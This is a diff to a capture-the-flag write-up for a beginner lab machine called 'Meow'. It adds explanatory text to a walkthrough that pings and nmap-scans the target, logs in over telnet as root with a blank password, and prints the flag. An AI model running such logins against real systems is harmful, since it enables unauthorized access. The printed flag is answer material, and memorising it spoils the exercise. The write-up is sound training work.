@@ -44,7 +44,7 @@ What username is able to log into the target over telnet with a blank password?
 
 ## Flags
 
-ping machine
+Ping the Target machine IP address
 ```shell
 [cry_baby@ace ~]$ ping 10.129.190.255
 PING 10.129.190.255 (10.129.190.255) 56(84) bytes of data.
@@ -57,6 +57,7 @@ PING 10.129.190.255 (10.129.190.255) 56(84) bytes of data.
 4 packets transmitted, 4 received, 0% packet loss, time 3004ms
 rtt min/avg/max/mdev = 10.216/10.303/10.452/0.093 ms
 ```
+Scan the Target machine's open ports
 ```shell
 [cry_baby@ace ~]$ nmap -sV 10.129.190.255
 Starting Nmap 7.95 ( https://nmap.org ) at 2024-08-14 21:50 EDT
@@ -69,6 +70,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 10.40 seconds
+```
+After analyzing nmap's results, we can see that port 23 is open and is running the telnet service. Try connecting to the target using telnet.
+```shell
 [cry_baby@ace ~]$ telnet 10.129.190.255
 Trying 10.129.190.255...
 Connected to 10.129.190.255.
@@ -81,7 +85,11 @@ Escape character is '^]'.
 
 
 
-Meow login: root
+Meow login:
+```
+
+```shell
+Meow Login: root
 Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -113,16 +121,15 @@ The list of available updates is more than a week old.
 To check for new updates run: sudo apt update
 
 Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
+root@Meow:~#
+```
+
+```shell
 root@Meow:~# ls
 flag.txt  snap
 root@Meow:~# cat flag.txt 
 b40abdfe23665f766f9c61ecba8a4c19
 root@Meow:~# 
-
-
-
-
-
 ```
 
 
